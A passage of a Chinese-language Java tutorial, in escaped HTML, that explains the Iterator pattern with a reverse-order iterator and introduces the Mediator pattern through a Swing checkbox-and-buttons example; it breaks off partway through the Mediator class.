&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">List&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">list&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">list&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后由Java编译器完成Iterator模式的所有循环代码。&lt;/p>
&lt;p>如何实现一个Iterator模式呢？我们以一个自定义的集合为例，通过Iterator模式实现倒序遍历：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">ReverseArrayCollection&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">T&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">Iterable&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">T&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">T&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">array&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">ReverseArrayCollection&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">T&lt;/span>&lt;span style="color:#f92672">...&lt;/span> &lt;span style="color:#111">objs&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">array&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Arrays&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">copyOfRange&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">objs&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">objs&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Iterator&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">T&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#75af00">iterator&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ReverseIterator&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">ReverseIterator&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">Iterator&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">T&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 索引位置:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">index&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">ReverseIterator&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 创建Iterator时,索引在数组末尾:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">index&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ReverseArrayCollection&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">array&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#75af00">hasNext&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 如果索引大于0,那么可以移动到下一个元素(倒序往前移动):
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">index&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">T&lt;/span> &lt;span style="color:#75af00">next&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 将索引移动到下一个元素并返回(倒序往前移动):
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">index&lt;/span>&lt;span style="color:#f92672">--;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">array&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#f92672">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>使用内部类的好处是内部类隐含地持有一个它所在对象的&lt;code>this&lt;/code>引用，可以通过&lt;code>ReverseArrayCollection.this&lt;/code>引用到它所在的集合。上述代码实现的逻辑非常简单，但是实际应用时，如果考虑到多线程访问，当一个线程正在迭代某个集合，而另一个线程修改了集合的内容时，是否能继续安全地迭代，还是抛出&lt;code>ConcurrentModificationException&lt;/code>，就需要更仔细地设计。&lt;/p>
&lt;h3 id="中介调停者mediator">中介/调停者Mediator&lt;/h3>
&lt;p>用一个中介对象来封装一系列的对象交互。中介者使各个对象不需要显式地相互引用，从而使其耦合松散，而且可以独立地改变它们之间的交互。&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220903144825329.png" alt="image-20220903144825329">&lt;/p>
&lt;p>这个小系统有4个参与对象：&lt;/p>
&lt;ul>
&lt;li>多选框；&lt;/li>
&lt;li>“选择全部”按钮；&lt;/li>
&lt;li>“取消所有”按钮；&lt;/li>
&lt;li>“反选”按钮。&lt;/li>
&lt;/ul>
&lt;p>它的复杂性在于，当多选框变化时，它会影响“选择全部”和“取消所有”按钮的状态（是否可点击），当用户点击某个按钮时，例如“反选”，除了会影响多选框的状态，它又可能影响“选择全部”和“取消所有”按钮的状态。&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220903144849479.png" alt="image-20220903144849479">&lt;/p>
&lt;p>如果我们引入一个中介，把多方会谈变成多个双方会谈，虽然多了一个对象，但对象之间的关系就变简单了&lt;/p>
&lt;p>&lt;img src="https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220903144925149.png" alt="image-20220903144925149">&lt;/p>
&lt;p>下面我们用中介模式来实现各个UI组件的交互。首先把UI组件给画出来：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">OrderFrame&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Hanburger&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;Nugget&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;Chip&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;Coffee&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">OrderFrame&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">JFrame&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">OrderFrame&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">...&lt;/span> &lt;span style="color:#111">names&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setTitle&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Order&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setSize&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">460&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#ae81ff">200&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setDefaultCloseOperation&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">JFrame&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">EXIT_ON_CLOSE&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Container&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">getContentPane&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setLayout&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">FlowLayout&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">FlowLayout&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">LEADING&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#ae81ff">20&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#ae81ff">20&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">JLabel&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Use Mediator Pattern&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">List&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">JCheckBox&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">checkboxList&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">addCheckBox&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">names&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">JButton&lt;/span> &lt;span style="color:#111">selectAll&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">addButton&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Select All&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">JButton&lt;/span> &lt;span style="color:#111">selectNone&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">addButton&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Select None&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">selectNone&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setEnabled&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">JButton&lt;/span> &lt;span style="color:#111">selectInverse&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">addButton&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Inverse Select&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Mediator&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">checkBoxList&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">selectAll&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">selectNone&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">selectInverse&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setVisible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">List&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">JCheckBox&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#75af00">addCheckBox&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">...&lt;/span> &lt;span style="color:#111">names&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">JPanel&lt;/span> &lt;span style="color:#111">panel&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">JPanel&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">panel&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">JLabel&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Menu:&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">List&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">JCheckBox&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">list&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ArrayList&lt;/span>&lt;span style="color:#f92672">&amp;lt;&amp;gt;();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">names&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">JCheckBox&lt;/span> &lt;span style="color:#111">checkbox&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">JCheckBox&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">list&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">checkbox&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">panel&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">checkbox&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">getContentPane&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">panel&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">list&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">JButton&lt;/span> &lt;span style="color:#75af00">addButton&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">label&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">JButton&lt;/span> &lt;span style="color:#111">button&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">JButton&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">label&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">getContentPane&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">button&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">button&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后，我们设计一个Mediator类，它引用4个UI组件，并负责跟它们交互：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Mediator&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 引用UI组件:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">List&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">JCheckBox&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">checkBoxList&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">JButton&lt;/span> &lt;span style="color:#111">selectAll&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">JButton&lt;/span> &lt;span style="color:#111">selectNone&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">JButton&lt;/span> &lt;span style="color:#111">selectInverse&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">Mediator&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">List&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">JCheckBox&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">checkBoxList&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">JButton&lt;/span> &lt;span style="color:#111">selectAll&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">JButton&lt;/span> &lt;span style="color:#111">selectNone&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">JButton&lt;/span> &lt;span style="color:#111">selectInverse&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">checkBoxList&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">checkBoxList&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">selectAll&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">selectAll&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">selectNone&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">selectNone&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">selectInverse&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">selectInverse&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 绑定事件:
